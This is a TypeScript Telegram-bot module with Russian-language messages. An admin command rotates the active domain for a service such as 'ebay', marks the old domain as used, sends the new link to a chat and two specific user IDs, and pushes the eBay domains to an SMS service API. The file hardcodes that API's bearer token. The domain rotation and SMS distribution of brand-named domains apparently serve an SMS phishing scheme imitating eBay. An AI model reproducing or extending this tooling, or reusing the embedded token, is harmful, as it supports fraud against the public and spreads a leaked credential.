import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {domensRepository, proDomensRepository} from "@/database";
import moment, {now} from "moment";
import {config} from "@/utils/config";
const request = require('request-promise')
import fetch from "node-fetch";
const regex = /^admin domen service (?<service>\w+) set (?<id>\d+)$/gmsi
export const composer = new Composer<Context>()
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const service = match.groups.service
    const id = Number(match.groups.id)

    const nowDomen = await domensRepository.findOne({
        where: {
            service,
            active: true
        }
    })

    const laterDomen = await domensRepository.findOne({
        where: {
            id
        }
    })

    if (!laterDomen) {
        return ctx.reply(`Не удалось найти новый домен для замен ${JSON.stringify(match)}`)
    }
    laterDomen.active = true
    laterDomen.dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')

    if (nowDomen) {
        nowDomen.active = false
        nowDomen.wasUsed = true
        await domensRepository.save([laterDomen, nowDomen])
    } else {
        await domensRepository.save([laterDomen])
    }
    updateSmsDomen()
    await ctx.api.sendMessage(config.chats.chat, `⚠️ Домен для <b>${service.toUpperCase()}</b> был только что изменен!`)
    await ctx.api.sendMessage(5933718791, `⚠️ Домен для <b>${service.toUpperCase()}</b> был только что изменен!\n\nNew Link: ${laterDomen.link}`)
    await ctx.api.sendMessage(5685044944, `⚠️ Домен для <b>${service.toUpperCase()}</b> был только что изменен!\n\nNew Link: ${laterDomen.link}`)


    return ctx.reply(`👍 Домен успешно изменен на ${laterDomen.link}!`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
            ]
        }
    })
}

export async function updateSmsDomen() {
    const domens = await domensRepository.find({
        where: {
            active: true
        }
    })

    const domensPro = await proDomensRepository.find({
        where: {
            active: true
        }
    })

    let domenList = []
    for (const obj of domens) {
        if (obj.service === 'ebay')
            domenList.push(/\.(.+)$/.exec(obj.link)[1])
    }

    for (const obj of domensPro) {
        if (obj.service === 'ebay')
            domenList.push(/\.(.+)$/.exec(obj.link)[1])
    }

    try {
        request.put(
            'https://api.sms.limited/api/domains',
            {
                json: true,
                headers: {
                    "Authorization": "Bearer 8fc303f5-8745-4ba0-b128-444666bc2652",
                    "Host": "api.sms.limited",
                    'Content-Type': 'application/json'
                },
                body: {
                    domains: domenList
                }
            })
            .then(console.log)
            .catch((err) => {

            })

    } catch (e) {
        console.log(e)
    }
}